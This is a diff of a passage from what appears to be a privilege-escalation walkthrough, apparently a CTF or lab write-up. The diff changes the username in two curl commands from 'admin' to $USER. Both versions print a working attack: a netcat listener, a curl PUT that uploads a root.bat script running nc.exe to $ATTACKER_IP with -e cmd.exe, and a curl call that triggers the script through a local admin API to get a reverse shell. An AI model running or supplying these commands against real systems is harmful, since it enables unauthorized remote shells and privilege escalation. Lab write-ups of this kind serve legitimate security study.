@@ -30,11 +30,11 @@ sudo nc -lvnp 4444
 Upload a script that runs the binary and connects back:
 
 ```bash
-curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/root.bat --data-binary "C:\Temp\nc.exe $ATTACKER_IP 4444 -e cmd.exe"
+curl -s -k -u $USER -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/root.bat --data-binary "C:\Temp\nc.exe $ATTACKER_IP 4444 -e cmd.exe"
 ```
 Trigger execution via queries API:
 ```bash
-curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/root/commands/execute?time=3m
+curl -s -k -u $USER https://127.0.0.1:8443/api/v1/queries/root/commands/execute?time=3m
 ```
 
 Now you will have the reverse connection at your attacker nc listener .
